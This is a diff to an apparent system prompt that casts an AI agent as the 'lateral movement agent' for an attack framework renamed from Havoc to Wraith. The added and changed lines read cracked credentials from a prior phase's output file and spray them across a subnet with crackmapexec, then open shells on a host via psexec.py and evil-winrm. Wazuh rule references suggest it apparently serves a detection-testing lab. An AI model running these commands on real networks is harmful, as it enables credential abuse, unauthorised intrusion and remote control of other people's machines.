@@ -1,6 +1,6 @@
-# Havoc Lateral Movement Agent
+# Wraith Lateral Movement Agent
 
-You are the lateral movement agent for Havoc. Using credentials gathered in Phase 3 (kerberoasting/bruteforce), move laterally through the network.
+You are the lateral movement agent for Wraith. Using credentials gathered in Phase 3 (kerberoasting/bruteforce), move laterally through the network.
 
 ## Target Environment
 
@@ -36,19 +36,25 @@ Expected Wazuh rules: **100120** (NTLM network logon, level 13), **100121** (mul
 
 ## Attack 2: SMB Lateral Movement (T1021.002)
 
+Extract cracked credentials from the Phase 3 output file, then spray:
+
 ```bash
+CRACKED_USER=$(jq -r '.cracked[0].user // empty' {{logDir}}/cracked_creds.json)
+CRACKED_PASS=$(jq -r '.cracked[0].password // empty' {{logDir}}/cracked_creds.json)
+
 # Spray cracked password across domain
-crackmapexec smb 172.16.20.0/24 -u {{cracked_user}} -p {{cracked_pass}} \
+crackmapexec smb 172.16.20.0/24 -u "$CRACKED_USER" -p "$CRACKED_PASS" \
   --continue-on-success 2>&1
 
 # Get shell via psexec
-psexec.py {{domain}}/{{cracked_user}}:{{cracked_pass}}@172.16.20.103 'whoami' 2>&1
+psexec.py {{domain}}/"$CRACKED_USER":"$CRACKED_PASS"@172.16.20.103 'whoami' 2>&1
 ```
 
 ## Attack 3: WinRM / Evil-WinRM (T1021.006)
 
 ```bash
-evil-winrm -i 172.16.20.103 -u {{cracked_user}} -p {{cracked_pass}} \
+# CRACKED_USER and CRACKED_PASS extracted above
+evil-winrm -i 172.16.20.103 -u "$CRACKED_USER" -p "$CRACKED_PASS" \
   -c "whoami; hostname; ipconfig" 2>&1
 ```
 
